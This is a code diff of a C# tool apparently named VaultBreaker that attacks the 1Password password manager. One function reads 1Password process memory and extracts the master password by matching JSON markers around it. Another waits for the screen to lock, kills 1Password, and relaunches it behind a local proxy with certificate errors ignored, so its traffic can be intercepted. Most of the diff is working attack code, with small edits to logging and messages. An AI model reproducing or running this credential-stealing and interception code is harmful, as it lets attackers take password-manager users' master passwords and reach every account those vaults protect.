@@ -19,15 +19,16 @@ namespace VaultBreaker.Core
 			//Step 3. Passwords 
 
 
-		public static void dump1password()
+		public static void dump1passwordMaster()
 		{
 			//Process[] procs = Process.GetProcessesByName("Bitwarden.exe");
 			Process[] procs = Process.GetProcessesByName("1Password");
 			Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);
 			foreach (var proc in procs)
 			{
-				#region oldcode
-				/**
+                DebugFunctions.writeDebug(String.Format("Enumerating Process: {0} - {1}", proc.Id, proc.ProcessName), Globals.DebugMode);
+                #region oldcode
+                /**
 				//IntPtr hProc = proc.Handle;
 				IntPtr hProc = WinAPI.OpenProcess(WinAPI.ProcessAccessFlags.QueryInformation | WinAPI.ProcessAccessFlags.VirtualMemoryRead, false, proc.Id);
 				WinAPI.MEMORY_BASIC_INFORMATION64 mbi = new WinAPI.MEMORY_BASIC_INFORMATION64();
@@ -69,32 +70,31 @@ namespace VaultBreaker.Core
 				sw.Close();
 				
 				**/
-				#endregion
-				//Slightly Dirty, but keeping the <LF> conversion to help rule out False Positives in output. Will need to re-visit this most likely.
-				//string strResult = File.ReadAllText(fileName).Replace("\n", "<LF>").Replace("\0", String.Empty);
-				string strResult = MemoryHelper.dumpProcessMemory(proc).Replace("\n", "<LF>").Replace("\0", String.Empty);
+                #endregion
+                //Slightly Dirty, but keeping the <LF> conversion to help rule out False Positives in output. Will need to re-visit this most likely.
+                //string strResult = File.ReadAllText(fileName).Replace("\n", "<LF>").Replace("\0", String.Empty);
+                string strResult = MemoryHelper.dumpProcessMemory(proc).Replace("\n", "<LF>").Replace("\0", String.Empty);
 				if (strResult.Contains("{\"name\":\"master-password\",\"value\":\""))
 				{
-					DebugFunctions.writeDebug("JSON FOUND");
-					int start, end;
-					//string strStartSearch = "{\"name\":\"master-password\",\"value\":\"";
+                    DebugFunctions.writeDebug("Found JSON Indicator, attempting to pull password", Globals.DebugMode);
+                    int start, end;
 					start = strResult.IndexOf("{\"name\":\"master-password\",\"value\":\"", 0) + 35;
-					//string strEndSearch = ",\"type\":\"P\",\"designation\":\"password\"},{\"name\":\"account-key\"";
 					end = strResult.IndexOf(",\"type\":\"P\",\"designation\":\"password\"},{\"name\":\"account-key\"", 0) - 1;
-					Console.WriteLine("Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
+					Console.WriteLine("[+] Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
+                    return;
 				}
 				else if (strResult.Contains("on 1password.com.<LF>")) {
-					DebugFunctions.writeDebug("Testing Backup");
+					DebugFunctions.writeDebug("First pass through didn't find anything, testing backup", Globals.DebugMode);
 					int start, end;
 					string strStartSearch = "on 1password.com.<LF>";
 					start = strResult.IndexOf(strStartSearch, 0) + 20;
 					end = strResult.IndexOf("<LF>secret key<LF>");
-					Console.WriteLine("Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
-					Console.ReadKey();
+					Console.WriteLine("[+] Potential 1Password Password Location found: {0}", strResult.Substring(start, end - start));
+                    return;
 				}
 				else
 				{
-					Console.WriteLine("Not Found");
+					Console.WriteLine("[-] Unable to locate Master Password :(");
 					Console.ReadKey();
 				}
 				Console.WriteLine("Fin. Press any key to exit");
@@ -103,12 +103,11 @@ namespace VaultBreaker.Core
 		}
 		public static void LaunchWithProxy(bool force)
 		{
-			DebugFunctions.writeDebug("Hello from LWP");
-
 			//Check if screen is locked.
+            //Need to fix this because it only checks for a lock change notification, and doesn't determine if the screen is locked.
 			if (!force)
 			{
-				DebugFunctions.writeDebug("Waiting for Screen to lock before bouncing application");
+				DebugFunctions.writeDebug("Waiting for Screen to lock before bouncing application", Globals.DebugMode);
 				Monitoring.CheckForWorkstationLocking workLock = new Monitoring.CheckForWorkstationLocking();
 
 				workLock.Run();
@@ -119,25 +118,25 @@ namespace VaultBreaker.Core
 					//wait a bit before checking again.
 					System.Threading.Thread.Sleep(10000);
 				};
-				DebugFunctions.writeDebug("Screen lock notification recieved, continuing.");
+				DebugFunctions.writeDebug("Screen lock notification recieved, continuing.", Globals.DebugMode);
 			}
 			string procPath = "";
 			Process[] procs = Process.GetProcessesByName("1Password");
 			if (procs.Length < 1)
 			{
-				DebugFunctions.writeDebug("No Processes found");
+				DebugFunctions.writeDebug("No Processes found", Globals.DebugMode);
 			}
 			foreach (var proc in procs)
 			{
 				if (procPath == "")
 				{
 					procPath = proc.MainModule.FileName;
-					DebugFunctions.writeDebug("Getting Process Path: " + procPath);
+					DebugFunctions.writeDebug("Getting Process Path: " + procPath, Globals.DebugMode);
 				}
 				//Kill All current Running Processes.
 				proc.Kill();
 			}
-			DebugFunctions.writeDebug("Starting Process with New Arguments");
+			DebugFunctions.writeDebug("Starting Process with New Arguments", Globals.DebugMode);
 			Process bw = new Process();
 			bw.StartInfo.FileName = procPath;
 			bw.StartInfo.Arguments = "--proxy-server=http://127.0.0.1:8888 --ignore-certificate-errors";
